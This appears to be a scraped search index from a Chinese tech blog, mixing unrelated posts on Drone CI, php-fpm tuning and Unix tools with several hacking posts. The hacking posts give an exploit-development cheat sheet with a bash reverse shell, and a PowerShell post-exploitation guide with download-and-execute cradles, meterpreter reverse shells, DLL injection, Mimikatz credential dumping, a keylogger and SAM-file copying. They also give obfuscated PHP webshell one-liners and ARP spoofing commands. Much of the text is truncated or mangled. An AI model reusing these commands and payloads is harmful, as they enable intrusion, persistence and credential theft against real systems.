https://en.wikipedia.org/wiki/Microsoft-specificexceptionhandlingmechanisms#SEH\n\t!mona suggest\n\t!mona nosafeseh\n\tnseh=\"\\xeb\\x06\\x90\\x90\" (next seh chain)\n\tiseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)\n\n\tROP (DEP)\n\t# https://en.wikipedia.org/wiki/Return-orientedprogramming\n\t# https://en.wikipedia.org/wiki/DataExecutionPrevention\n\t!mona modules\n\t!mona ropfunc -m .dll -cpb \"\\x00\\x09\\x0a\"\n\t!mona rop -m .dll -cpb \"\\x00\\x09\\x0a\" (auto suggest)\n\n\tASLR - Address space layout randomization\n\t# https://en.wikipedia.org/wiki/Addressspacelayoutrandomization\n\t!mona noaslr\n\n\tEGG Hunter techniques\n\t# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/\n\t# http://www.fuzzysecurity.com/tutorials/expDev/4.html\n\t!mona jmp -r esp\n\t!mona egg -t lxxl\n\t\\xeb\\xc4 (jump backward -60)\n\tbuff=lxxllxxl+shell\n\t!mona egg -t 'w00t'\n\n\tGDB Debugger Commands\n\t# Setting Breakpoint\n\tbreak start\n\t# Execute Next Instruction\n\tnext\n\tstep\n\tn\n\ts\n\t# Continue Execution\n\tcontinue\n\tc\n\t# Data\n\tchecking 'REGISTERS' and 'MEMORY'\n\t# Display Register Values: (Decimal,Binary,Hex)\n\tprint /d –  Decimal\n\tprint /t –  Binary\n\tprint /x –  Hex\n\tO/P :\n\t(gdb) print /d $eax\n\t$17 = 13\n\t(gdb) print /t $eax\n\t$18 = 1101\n\t(gdb) print /x $eax\n\t$19 = 0xd\n\t(gdb)\n\t# Display values of specific memory locations\n\tcommand : x/nyz (Examine)\n\tn –  Number of fields to display ==  y –  Format for output ==  c (character) , d (decimal) , x (Hexadecimal)\n\tz –  Size of field to be displayed ==  b (byte) , h (halfword), w (word 32 Bit)\n\n\tBASH Reverse Shell\n\tbash -i   \u0026 /dev/tcp/X.X.X.X/443 0  \u00261\n\texec /bin/bash 0\u00260 2  \u00260\n\texec /bin/bash 0\u00260 2  \u00260\n\t0\u0026196;exec 196","tags":null},{"location":"//blog.pytool.com/Hacker/2015-10-25 powershell内网渗透","title":"powershell内网渗透","text":"0x01 Powershell\n     Powershell 启动 Powershell\n     查看版本 $PSVersionTable.PSVersion\n以管理员启动Powershell\n Start-Process notepad -Verb runas\n Start-Process \"$PSHOME\\powershell.exe\" -Verb runas\n具有一致的命名规范，都采用动词- 名词形式，如New-Item\n动词部分一般为Add、New、Get、Remove、Set等\n\n模块路径: $Env:PSModulePath\n\n 0x02 Powershell 文件操作\n   以文件操作为例讲解PowerShell命令的基本用法\n 新建目录 New-Item whitecellclub -ItemType Directory\n 新建文件 New-Item light.txt -ItemType File\n 删除目录 Remove-Item whitecellclub\n 显示文本内容 Get-Content light.txt\n 设置文本内容 Set-Content light.txt -Value \"i love light so much\"\n 追加内容 Add-Content light.txt -Value \"but i love you more\"\n 清除内容 Clear-Content light.txt\n\n0x03 powershell脚本\n了解计算机上的现用执行策略，键入：get-executionpolicy\n Restricted——默认的设置， 不允许任何script运行\n AllSigned——只能运行经过数字证书签名的script\n RemoteSigned——运行本地的script不需要数字签名，但是运行从网络上\n下载的script就必须要有数字签名\n Unrestricted——允许所有的script运行。\n若要在本地计算机上运行您编写的未签名脚本和来自其他用户的签名脚本，\n请使用以下命令将计算机上的执行策略更改为 RemoteSigned：\nset-executionpolicy remotesigned\n\n 0x04 powershell 安全\n本地权限绕过执行\nPowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1\n本地隐藏权限绕过执行脚本\nPowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden（隐藏窗口） -File xxx.ps1\n直接用IEX下载远程的PS1脚本回来权限绕过执行\npowershell \"IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); InvokeMimikatz -DumpCreds\"\n\n0x05 powersploit 后渗透\n\ngit clone https://github.com/PowerShellMafia/PowerSploit.git\n创建本地服务: python -m SimpleHTTPServer\nCodeExecution 在目标主机执行代码\nScriptModification 在目标主机上创建或修改脚本\nPersistence 后门脚本（持久性控制）\nAntivirusBypass 发现杀软查杀特征\nExfiltration 目标主机上的信息搜集工具\nMayhem 蓝屏等破坏性脚本\nRecon 以目标主机为跳板进行内网信息侦查\n\n远程代码执行：\nIEX (New-Object Net.WebClient).DownloadString(“http://ipaddress/path/xxx.ps1”)\n\n 0x06\npython -m SimpleHTTPServer\n目标主机‘安装’invoke-shellcode脚本\nIEX (New-Object Net.WebClient).DownloadString(\"http://127.0.0.1:8000/CodeExecution/Invoke-Shellcode.ps1\")\n查看帮助信息\nGet-Help Invoke-Shellcode\n2、目标主机开启反弹马：Lhost 为服务器的KALI\nInvoke-Shellcode -Payload windows/meterpreter/reversehttps -Lhost 192.168.100.33 -Lport 4444 -Force\n\n一、当前进程注入meterpreter反弹马payload\n1、Kali Linux开启metasploit监听：\nmsf   use exploit/multi/handler\n\nmsf exploit(handler)   set PAYLOAD windows/meterpreter/reversehttps\n  PAYLOAD =  windows/meterpreter/reversehttps\n\nmsf exploit(handler)   set LHOST 192.168.146.129\n  LHOST =  192.168.146.129\n\nmsf exploit(handler)   set LPORT 4444\n  LPORT =  4444\n\nmsf exploit(handler)   exploit\n\n3、Linux成功接收，得到一个meterpreter的shell\n\n0x07 进程注入\n二、指定进程注入反弹马\n1、Get-Process获取当前进程\n也可以新建一个隐藏进\n程并注入：\nStart-Process c:\\windows\\system32\\notepad.exe -WindowStyle Hidden\n25 www.whitecell.club\n内网渗透实例\n2、注入\nInvoke-Shellcode -ProcessID 1628 -Payload\nwindows/meterpreter/reversehttps -Lhost 192.168.146.129 -Lport 4444\n\n 0x08 DLL 注入\n可以利用powersploit将dll文件注入到当前进程中，但是dll文件必须在目标主\n机上。\n1、下载安装powersploit的dll注入脚本：\nIEX (New-Object\nNet.WebClient).DownloadString(\"http://192.168.146.129/CodeExecution/Inv\noke-DllInjection.ps1\")\n2、用metasploit生成一个dll反弹马\nmsfvenom -p windows/x64/meterpreter/reversetcp\nLHOST=192.168.146.129 LPORT=4444 -f dll   /var/www/msf.dll\n3、将DLL文件传输到目标主机\n3、开启一个隐藏进程并注入DLL\nStart-Process c:\\windows\\system32\\notepad.exe -WindowStyle Hidden\nInvoke-DllInjection -ProcessID 2356 -Dll .\\msf.dll\n4、修改metasploit监听设置并启动\n\n0x09 端口扫描\n\nInvoke-Portscan端口扫描\nIEX(New-Object Net.WebClient).DownloadString(\"http://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1\")\nInvoke-Portscan -Hosts 192.168.146.133,192.168.146.129 -Ports\n\"21,22,80,8080,1433,3389\"\n\n 0x10 Invoke-Mimikatz 查看主机密码（需要管理员权限）\n下载执行脚本：\nIEX (New-Object\nNet.WebClient).DownloadString(\"http://192.168.146.129/Exfiltration/Invoke-Mimikatz.ps1\")\nDUMP密码：\nInvoke-Mimikatz -DumpCreds\nmimikatz作者博客：\nhttp://blog.gentilkiwi.com/mimikatz\nhttps://github.com/gentilkiwi/mimikatz/releases/tag/2.0.0-alpha-20150906\n0x11\n键盘记录（详细的鼠标、键盘输入记录）\nIEX (New-Object\nNet.WebClient).DownloadString(\"http://192.168.146.129/Exfiltratio\nn/Get-Keystrokes.ps1\")\nGet-Keystrokes -LogPath .\\keylogger.txt\n 0x12 超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）\nIEX (New-Object\nNet.WebClient).DownloadString(\"http://192.168.146.129/Exfiltration/InvokeNinjaCopy.ps1\")\nInvoke-NinjaCopy -Path \"C:\\Windows\\System32\\config\\SAM\"\n LocalDestination \"C:\\Users\\light\\Desktop\\SAM\"","tags":null},{"location":"//blog.pytool.com/Post/2017-04-18 编码规范","title":"编码规范","text":"前端\n百度\n\nJavascript编码规范\nJavascript编码规范 - ESNext补充篇\nHTML编码规范\nCSS编码规范\nLess编码规范\nE-JSON数据传输标准\n模块和加载器规范\n包结构规范\n项目目录结构规范\n图表库标准\nreact编码规范\n\n腾讯\n\n嗨学网前端开发规范","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone支持webhook","title":"drone支持webhook","text":"https://github.com/drone-plugins/drone-webhook\n\nnotify:\n  webhook:\n    debug: true\n    method: POST\n    auth:\n      username: $$TOWERUSER\n      password: $$TOWERPASS\n    urls:\n      http://tower.example.com/api/v1/jobtemplates/44/launch/\n      http://tower.example.com/api/v1/jobtemplates/45/launch/\n      contenttype: application/json\n      template: '{\"name\": \"project.deploy\",\"extravars\": \"{\\\"env\\\": \\\"dev\\\",\\\"gitbranch\\\": \\\"{{ build.branch }}\\\",\\\"hipchattoken\\\": \\\"$$HIPCHATTOKEN\\\"}\"}'\n\nhttps://github.com/zyclonite/drone-webhook\n\npipeline:\n  notify:\n    image: zyclonite/drone-webhook\n    webhook: https://your.domain.com/drone/hook\n    token: bearer token for authentication\n    skipverify: false|true\n    when:\n      status: [ success, failure ]\n\n`","tags":null},{"location":"//blog.pytool.com/Hacker/shells/2016-03-29 一句话木马","title":"一句话","text":"---\nPHP\n ?php eval($POST[$GET[\"id\"]]);? \n ?php eval($POST[witkey]);? \n  pwd:[witkey] Encoder:[default]\n ?php assert($POST[sb]);? \n\n ?php $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($POST[cc]);  ? \n  pwd:[cc] Encoder:[base64]\n` \u003c?php\n      $ant=base64decode(\"YXNzZXJ0\");\n      $ant($POST['ant']); `\n  pwd:[ant] Encoder:[base64]\n\n菜刀一句话 pwd:[h] Encoder:[base64]\n ` \u003c?php\n      $hh = \"p\".\"r\".\"e\".\"g\".\"\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\";\n      $hh(\"/[discuz]/e\",$POST['h'],\"Access\"); `\n  ?php ($=@$GET[2]).@$($POST[1])? \n  ?2=assert pwd:[1] Encoder:[base64]\n\n ?php @$GETa);? \n 超级隐蔽的PHP后门：\n ?a=assert\u0026b=${fputs%28fopen%28base64decode%28Yy5waHA%29,w%29,base64decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29}; \n ?php $GETa);? \n利用方法：","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-03-29 ARPspoof","title":"ARPspoof","text":"\n\nUsage: arpspoof [-i interface] [-t target] host\n\t-i interface 指定使用的网卡\n\t-c own|host|both 攻击结束后如何恢复\n\t-r \t\t\t\t双向毒化\n\t-t target 指定要攻击的目标\n\thost \t\t\t指定要拦截的主机(默认为网关)\n\n启动Arpspoof注入攻击目标系统。攻击的方法是攻击者（192.168.6.100）发送ARP数据包，以欺骗网关（192.168.6.1）和目标系统（192.168.6.101）。\n下面首先欺骗目标系统，执行命令如下所示：\narpspoof -i eth0 -t 192.168.6.101 192.168.6.1\n使用Arpspoof欺骗网关。执行命令如下所示：\narpspoof -i eth0 -t 192.168.6.1 192.168.6.101\n\n##########\nDon't forget to enable IP forwarding on your host so that the traffic goes through your host. Otherwise victim will loose connectivity.\necho 1   /proc/sys/net/ipv4/ip_forward\n\nIn order to tell the victim host that now we (our MAC address) are the one belonging to the IP of the gateway enter the following command:\n arpspoof -t victim gateway\n\nIn a seperate shell we start the matching command to fool gateway to belive we are victim.\narpspoof -t gateway victim","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 Linux 常用软件","title":"Linux常用命令","text":"linux 下截图工具 gpick","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-10 Android应用开发 Jni","title":"Android应用开发环境搭建","text":"Create Hello-JNI with Android Studio\n\nAndroid NDK Preview\n\nAdvanced Gradle Fundamentals for C/C++ Training Course\n\nAndroid Studio使用gradle-experimental构建NDK工程(无需Android.mk、Application.mk文件)","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone支持缓存","title":"drone支持缓存","text":"Volume Cache | Plugins | Drone\nhttps://stackoverflow.com/questions/41412481/whether-drone-io-support-reusing-docker-container-for-build\n\nmatrix:\n  include:\n    REPOURL: \"git.yimengapp.com\"\n      LOCALVOLUME: \"/var/www/yimeng\"\n      #\npipeline:\n  clone:\n    image: plugins/git\n    volumes:\n      ${LOCALVOLUME}/master:/drone/src/${REPOURL}/${DRONEREPO}\n    when:\n      branch: master\n\n  clone:\n    image: plugins/git\n    volumes:\n      ${LOCALVOLUME}/release:/drone/src/${REPOURL}/${DRONEREPO}\n    when:\n      branch: release\n\n  clone:\n    image: plugins/git\n    volumes:\n      ${LOCALVOLUME}/develop:/drone/src/${REPOURL}/${DRONEREPO}\n    when:\n      branch: [ dev, develop ]\n\n  busybox:\n    image: busybox\n    volumes:\n      ${LOCALVOLUME}/:${LOCALVOLUME}\n    commands:\n      if [ ${DRONEBRANCH} == master ]; then chown -R 33:33 ${LOCALVOLUME}/master ; fi\n      if [ ${DRONEBRANCH} == release ]; then chown -R 33:33 ${LOCALVOLUME}/release ; fi\n      if [ ${DRONEBRANCH} == develop ]; then chown -R 33:33 ${LOCALVOLUME}/develop ; fi\n\ndrone secret add --image=plugins/ssh yimeng/php-yimeng SSHKEY @/home/ubuntu/.ssh/idrsa\n drone sign yimeng/php-yimeng\n\npipeline:\n  restore-cache:\n    image: drillster/drone-volume-cache\n    restore: true\n    mount:\n      .git\n    volumes:\n      /tmp/cache:/cache\n  clone:\n    image: plugins/git\n    # PUT YOUR BUILD STEPS HERE #\n\n  ssh-master:\n    image: plugins/ssh\n    host: [ qubuluo.com ]\n    user: root\n    port: 22\n    script:\n      echo master   master.txt\n      echo master\n    when:\n      branch: master\n  ssh-dev:\n    image: plugins/ssh\n    host: [ qubuluo.com ]\n    user: root\n    port: 22\n    script:\n      echo dev   dev.txt\n      echo dev\n    when:\n      branch: dev\n\n  rebuild-cache:\n    image: drillster/drone-volume-cache\n    rebuild: true\n    mount:\n      .git\n    volumes:\n      /tmp/cache:/cache\n\ndrone secret add --image=plugins/ssh yimeng/php-yimeng SSHKEY @/home/ubuntu/.ssh/idrsa\n drone sign yimeng/php-yimeng\n\npipeline:\n  restore-cache:\n  image: drillster/drone-volume-cache\n  restore: true\n  mount:\n    .git\n  volumes:\n    /tmp/cache:/cache\n  clone:\n    image: plugins/git\n    # PUT YOUR BUILD STEPS HERE #\n  rebuild-cache:\n    image: drillster/drone-volume-cache\n    rebuild: true\n    mount:\n      .git\n    volumes:\n      /tmp/cache:/cache\nI have setup drone.io locally and created a .drone.yml for CI build. But I found drone removes the docker container after finishing the build Whether it support reusing the docker container? I am working on gradle project and the initial build takes a long time to download java dependencies.\n\nUPDATE1\n\nI used below command to set the admin user on running drone-server container.\n\ndocker run -d \\\n -e DRONEGITHUB=true \\\n -e DRONEGITHUBCLIENT=\"xxxx\" \\\n -e DRONEGITHUBSECRET=\"xxxx\" \\\n -e DRONESECRET=\"xxxx\" \\\n -e DRONEOPEN=true  \\\n -e DRONEDATABASEDRIVER=mysql \\\n -e DRONEDATABASEDATASOURCE=\"root:root@tcp(mysql:3306)/drone?parseTime=true\" \\\n -e DRONEADMIN=\"joeyzhao0113\" \\\n --restart=always \\\n --name=drone-server \\\n --link=mysql \\\n drone/drone:0.5\n\nAfter doing this, I use the user joeyzhao0113 to login drone server but failed to enable the Trusted flag on the setting page. The popup message dialog shows setting successfully see below screenshot. But the flag keep showing disabled always.\n0\ndown vote\n\nNo, it is not possible to re-use a Docker container for your Drone build. Build containers are ephemeral and are destroyed at the end of every build.\n\nThat being said, it doesn't mean your problem cannot be solved.\n\nI think a better way to phrase this question would be \"how do I prevent my builds from having to re-download dependencies\"? There are two solutions to this problem.\nOption 1, Cache Plugin\n\nThe first, recommended solution, is to use a plugin to cache and restore your dependencies. Cache plugins such as the volume cache and s3 cache are community contributed plugins.\npipeline:\n # restores the cache from a local volume\n restore-cache:\n   image: drillster/drone-volume-cache\n   restore: true\n   mount: [ /drone/.gradle, /drone/.m2 ]\n   volumes: /tmp/cache:/cache\n\n build:\n   image: maven\n   environment:\n     M2HOME=/drone/.m2\n     MAVENHOME=/drone/.m2\n     GRADLEUSERHOME=/drone/.gradle\n   commands:\n     mvn install\n     mvn package\n\n # rebuild the cache in case new dependencies were\n # downloaded during your build\n rebuild-cache:\n   image: drillster/drone-volume-cache\n   rebuild: true\n   mount: [ /drone/.gradle, /drone/.m2 ]\n   volumes: /tmp/cache:/cache\nOption 2, Custom Image\n\nThe second solution is to create a Docker image with your dependencies, publish to DockerHub, and use this as your build image in your .drone.yml file.\n\npipeline:\n build:\n   image: some-image-with-all-my-dependencies\n   commands:\n     mvn package\n\n     the default workspace base is /drone assuming you didn't override the default base value. This means you can set GRADLEUSER_HOME=/drone/.gradle to instruct gradle to store the dependencies in your workspace, making accessible to the cache plugin. I've updated the example in my answer to show how this could work. – Brad Rydzewski","tags":null},{"location":"//blog.pytool.com/Linux/2011-01-01 Linux系统优化 PHP-php-fpm配置优化","title":"Linux  php-fpm 优化","text":"---\n\n前言:\n\n　　1.少安装PHP模块, 费内存\n\n　　2.调高linux内核打开文件数量，可以使用这些命令(必须是root帐号)(我是修改/etc/rc.local，加入ulimit -SHn 51200的)\n\necho ulimit -HSn 65536     /etc/profile\necho ulimit -HSn 65536     /etc/rc.local\nsource /etc/profile\n　　如果ulimit -n数量依旧不多(即上面配置没生效)的话, 可以在 /etc/security/limits.conf 文件最后加上\n\nsoft nofile 51200\nhard nofile 51200\n1.与Nginx使用Unix域Socket通信(Nginx和php-fpm在同一台服务器)\n\n　　Unix域Socket因为不走网络，的确可以提高Nginx和php-fpm通信的性能，但在高并发时会不稳定。\n\n　　Nginx会频繁报错：connect() to unix:/dev/shm/php-fcgi.sock failed (11: Resource temporarily unavailable) while connecting to upstream\n\n　　可以通过下面两种方式提高稳定性：\n　　1）调高nginx和php-fpm中的backlog\n    　　 配置方法为：在nginx配置文件中这个域名的server下，在listen 80后面添加default backlog=1024。\n     　　同时配置php-fpm.conf中的listen.backlog为1024，默认为128。\n　　2）增加sock文件和php-fpm实例数\n     　　再新建一个sock文件，在Nginx中通过upstream模块将请求负载均衡到两个sock文件背后的两套php-fpm实例上。\n\n2.php-fpm参数调优\n\n　　pm = dynamic; 表示使用哪种进程数量管理方式\n\n　　　　dynamic表示php-fpm进程数是动态的，最开始是pm.startservers指定的数量，如果请求较多，则会自动增加，保证空闲的进程数不小于pm.minspareservers，如果进程数较多，也会进行相应清理，保证多余的进程数不多于pm.maxspareservers\n\n　　　　static表示php-fpm进程数是静态的, 进程数自始至终都是pm.maxchildren指定的数量，不再增加或减少\n\n　　pm.maxchildren = 300; 静态方式下开启的php-fpm进程数量\n　　pm.startservers = 20; 动态方式下的起始php-fpm进程数量\n　　pm.minspareservers = 5; 动态方式下的最小php-fpm进程数量\n　　pm.maxspareservers = 35; 动态方式下的最大php-fpm进程数量\n\n　　　　如果pm为static, 那么其实只有pm.maxchildren这个参数生效。系统会开启设置数量的php-fpm进程\n\n　　　　如果pm为dynamic, 那么pm.maxchildren参数失效，后面3个参数生效。系统会在php-fpm运行开始的时候启动pm.startservers个php-fpm进程，然后根据系统的需求动态在pm.minspareservers和pm.maxspareservers之间调整php-fpm进程数\n\n　　　　那么，对于我们的服务器，选择哪种pm方式比较好呢？事实上，跟Apache一样，运行的PHP程序在执行完成后，或多或少会有内存泄露的问题。这也是为什么开始的时候一个php-fpm进程只占用3M左右内存，运行一段时间后就会上升到20-30M的原因了。\n\n　　　　对于内存大的服务器（比如8G以上）来说，指定静态的maxchildren实际上更为妥当，因为这样不需要进行额外的进程数目控制，会提高效率。因为频繁开关php-fpm进程也会有时滞，所以内存够大的情况下开静态效果会更好。数量也可以根据 内存/30M 得到，比如8GB内存可以设置为100，那么php-fpm耗费的内存就能控制在 2G-3G的样子。如果内存稍微小点，比如1G，那么指定静态的进程数量更加有利于服务器的稳定。这样可以保证php-fpm只获取够用的内存，将不多的内存分配给其他应用去使用，会使系统的运行更加畅通。\n\n　　　　对于小内存的服务器来说，比如256M内存的VPS，即使按照一个20M的内存量来算，10个php-cgi进程就将耗掉200M内存，那系统的崩溃就应该很正常了。因此应该尽量地控制php-fpm进程的数量，大体明确其他应用占用的内存后，给它指定一个静态的小数量，会让系统更加平稳一些。或者使用动态方式，因为动态方式会结束掉多余的进程，可以回收释放一些内存，所以推荐在内存较少的服务器或VPS上使用。具体最大数量根据 内存/20M 得到。比如说512M的VPS，建议pm.maxspareservers设置为20。至于pm.minspareservers，则建议根据服务器的负载情况来设置，比较合适的值在5~10之间。\n\n　　　　在4G内存的服务器上200就可以(我的1G测试机，开64个是最好的，建议使用压力测试获取最佳值)\n\n　　pm.maxrequests = 10240;\n\n　　　　nginx php-fpm配置过程中最大问题是内泄漏出问题：服务器的负载不大，但是内存占用迅速增加，很快吃掉内存接着开始吃交换分区，系统很快挂掉！其实根据官方的介绍，php-cgi不存在内存泄漏，每个请求完成后php-cgi会回收内存，但是不会释放给操作系统，这样就会导致大量内存被php-cgi占用。\n　　　　\n\n　　　　官方的解决办法是降低PHPFCGIMAXREQUESTS的值，如果用的是php-fpm，对应的php-fpm.conf中的就是maxrequests，该值的意思是发送多少个请求后会重启该线程，我们需要适当降低这个值，用以让php-fpm自动的释放内存，不是大部分网上说的51200等等，实际上还有另一个跟它有关联的值maxchildren，这个是每次php-fpm会建立多少个进程，这样实际上的内存消耗是maxchildrenmaxrequests每个请求使用内存，根据这个我们可以预估一下内存的使用情况，就不用再写脚本去kill了。\n\n　　requestterminatetimeout = 30;\n\n　　　　最大执行时间, 在php.ini中也可以进行配置(maxexecutiontime)\n\n　　requestslowlogtimeout = 2; 开启慢日志\n　　slowlog = log/$pool.log.slow; 慢日志路径\n\n　　rlimitfiles = 1024; 增加php-fpm打开文件描述符的限制\n\n3.php-fpm的高CPU使用率排查方法\n\n　　1)使用top命令, 直接执行top命令后，输入1就可以看到各个核心的CPU使用率。而且通过top -d 0.1可以缩短采样时间\n\n　　2)查询php-fpm慢日志\n\ngrep -v \"^$\" www.log.slow.tmp | cut -d \" \" -f 3,2 | sort | uniq -c | sort -k1,1nr | head -n 50\n\n复制代码\n   5181 run() /www/test.net/framework/web/filters/CFilter.php:41\n\n   5156 filter() /www/test.net/framework/web/filters/CFilterChain.php:131\n\n   2670 = /www/test.net/index.php\n\n   2636 run() /www/test.net/application/controllers/survey/index.php:665\n\n   2630 action() /www/test.net/application/controllers/survey/index.php:18\n\n   2625 run() /www/test.net/framework/web/actions/CAction.php:75\n\n   2605 runWithParams() /www/test.net/framework/web/CController.php:309\n\n   2604 runAction() /www/test.net/framework/web/filters/CFilterChain.php:134\n\n   2538 run() /www/test.net/framework/web/CController.php:292\n\n   2484 runActionWithFilters() /www/test.net/framework/web/CController.php:266\n\n   2251 run() /www/test.net/framework/web/CWebApplication.php:276\n\n   1799 translate() /www/test.net/application/libraries/Limesurveylang.php:118\n\n   1786 loadtables() /www/test.net/application/thirdparty/php-gettext/gettext.php:254\n\n   1447 runController() /www/test.net/framework/web/CWebApplication.php:135\n复制代码\n　　　　参数解释:\n\n                sort:  对单词进行排序\n                uniq -c:  显示唯一的行，并在每行行首加上本行在文件中出现的次数\n                sort -k1,1nr:  按照第一个字段，数值排序，且为逆序\n                head -10:  取前10行数据\n\n　　3)用strace跟踪进程\n\n　　　　a)利用nohup将strace转为后台执行，直到attach上的php-fpm进程死掉为止：\n\nnohup strace -T -p 13167   13167-strace.log \u0026\n　　　　参数说明:\n\n　　　　　  -c 统计每一系统调用的所执行的时间,次数和出错的次数等.\n                -d 输出strace关于标准错误的调试信息.\n                -f 跟踪由fork调用所产生的子进程.\n                -o filename,则所有进程的跟踪结果输出到相应的filename\n                -F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.\n                -h 输出简要的帮助信息.\n                -i 输出系统调用的入口指针.\n                -q 禁止输出关于脱离的消息.\n                -r 打印出相对时间关于,,每一个系统调用.\n                -t 在输出中的每一行前加上时间信息.\n                -tt 在输出中的每一行前加上时间信息,微秒级.\n                -ttt 微秒级输出,以秒了表示时间.\n                -T 显示每一调用所耗的时间.\n                -v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出.\n                -V 输出strace的版本信息.\n                -x 以十六进制形式输出非标准字符串\n                -xx 所有字符串以十六进制形式输出.\n                -a column\n                设置返回值的输出位置.默认为40.\n                -e execve 只记录 execve 这类系统调用\n                -p 主进程号\n\n　　　　b)用利用-c参数让strace帮助汇总，非常方便非常强大！\n\n复制代码\n[root@b28-12 log]# strace -cp 9907\n\nProcess 9907 attached - interrupt to quit\n\nProcess 9907 detached\n\n% time     seconds  usecs/call     calls    errors syscall","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/io2","title":"golang中io包用法（二）","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 VIM 插件","title":"文本编辑 Vim 插件","text":"delimitMate 用于补全括号和引号\n    vim-surround 用于快速切换括号/引号或者标签\n    GitGutter 实时显示git更改\n    Gitv 查看Git详细提交日志(类似gitk)\n    vim-commentary Vim批量注释工具, 可以注释多行和去除多行注释\n    indentLine 更加美观的显示缩进对齐线\nvim-signature  marks","tags":null},{"location":"//blog.pytool.com/Linux/2015-03-20-unix-tools","title":"UNIX那些实用工具","text":"---\n\nUNIX那些实用工具 \n\n用户 \n\nid 可以看自己加入了哪些组。\nwho 看都有谁在系统上。\nadduser username groupname和 deluser username groupname\nusermod 可以更改所属组\n\n硬件信息 \n\ncat /proc/cpuinfo  查看cpu信息\ncat /proc/meminfo  查看硬盘信息\nlspci -tv          以树的形式输出连接到PCI上的设备\nhdparm -I /dev/sda    查看第一块串口硬盘的信息\ndf -h         查看各个存储设备的剩余空间\ndu -sh dirname 查看该目录的总大小，如果不给目录名，就是当前目录\n  的大小。相当于 du -csh。\ndu -ks是以K为单位显示大小，而du -ms是以兆为单位。\n\n文件系统 \n\nmkdir 加参数 -p 可以一次建立一个很深的目录，中间如果有原来不存在的目录\n，会自动建立。\n\nmv的几个有用选项\n\n-b 如果目的文件存在，就创造一个备份。\n-f 强暴的，如果目的文件存在就覆盖它，默认选项。\n-i 礼貌的，如果目的文件存在，会询问是否要覆盖。\n-u 只有当源文件比目的文件新或者目的文件不存在时才移动。\n\n查看目录：ls \n\nls -F可以对目录下的文件分类显示，例如目录后显示/，可执行文件后显示*。\nls -X 按文件类型分类显示\nls -ld directory 可显示某个目录的访问权限等详细信息。\nls -r(--reverse) 按字母表逆序按列显示目录内容。如 ls -lhSr按文\n  件大小排序，不过文件越大，越排在后面。\nls -x 横向按行显示目录内容。\nls -lh 在显示目录内容时，以人类可读的方式给出文件大小。\n  -h = --human-readable\nls -R 递归的显示一个目录及其子目录下的文件。\n\n目录栈 \n\n查看目录栈：dirs。如果目录栈为空，则只显示当前的工作目录。\n切换到新目录：pushd newpath。新路径会放在栈顶。\n切换栈中最顶上两项：pushd不加参数。\n  同时目录也切换，使用cd -可以实现同样的功能。\npushd +n 将从栈顶（栈顶为第0个）算起第n个目录和后面的项提到\n  栈顶元素前面，原第n项成为栈顶，并成为当前目录。\npushd -n 将从栈底（栈底为第0个）算起第n个目录和后面的项提到\n  栈顶元素前面，原倒数第n项成为栈顶，并成为当前目录。\npopd，弹出栈顶项，目录切换到新的栈顶。\npopd +n 把从栈顶算起第n项弹出，目录并不切换。\npopd -n 把从栈底算起第n项弹出，目录并不切换。\n\n建立链接 ln \n\nln [参数] 目标 [链接名]\n\n-f 强制删除已经存在的目标文件\n-s 创建符号链接\n-t 在指定目录创建链接\n\n显示和设置系统时间：date \n\n用date查看时间大概每个人都知道，但有几个人会用date设置系统时间呢？\n\n    # set time described by STRING\n    date --set=STRING\n\n问题的关键是那个STRING应该怎么写，经实验表明，\n按照date输出的格式写设定时间的字符串即可。\n这个date真的很好用，不用担心系统重启后时钟又改回去，\n可能用date写入系统时钟的同时已写入硬件时钟了。\n\n文件补丁：diff 和 patch \n\n这两个古老而实用的Unix工具！\n\n    diff a.txt b.txt   1.diff\n\n生成一个补丁。\n\n    patch a.txt 1.diff\n\n对a.txt应用补丁，将把a.txt变得和b.txt一模一样。\n\ndiff是按行为单位比较文件的，也比较容易读懂：\n\n    0a1\n      hehe!\n\n表示在第0行生成第1行：hehe!\n\n    1c1\n    \u003c aaaa","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/io1","title":"golang 中io包用法（一）","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/io_ioutil","title":"golang中io/ioutil包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/流媒体/2016-02-29 EasyDarwin配置","title":"EasyDarwin 配置","text":"killall -9 easydarwin\n\nchmod 755 /dev/shm/Movies/ #403错误\n\n./Buildit x64\ncp -r WinNTSupport/easydarwin.xml x64/\ncp -r WinNTSupport/Movies/ x64/\ncp -r WinNTSupport/html/ x64/\n\ncp WinNTSupport/Movies/crossdomain.xml /usr/local/nginx/html\ncp crossdomain.xml /usr/local/nginx/html\n\nhttp://192.168.1.110:8088/login.html\n\n1.配置easydarwin\n\t/dev/shm/Movies/\n\n\trtsp://218.204.223.237:554/live/1/66251FC11353191F/e7ooqwcfbqjoo80j.sdp\n\neasydarwin.xml\n!-- EasyDarwin推流模式配置 --\nMODULE NAME=\"QTSSReflectorModule\" \n\t\tPREF NAME=\"reflectorbucketsize\" TYPE=\"UInt32\" 16/PREF\n\t\tPREF NAME=\"reflectordelay\" TYPE=\"UInt32\" 100/PREF\n\t\tPREF NAME=\"allownonsdpurls\" TYPE=\"Bool16\" false/PREF\n\t\tPREF 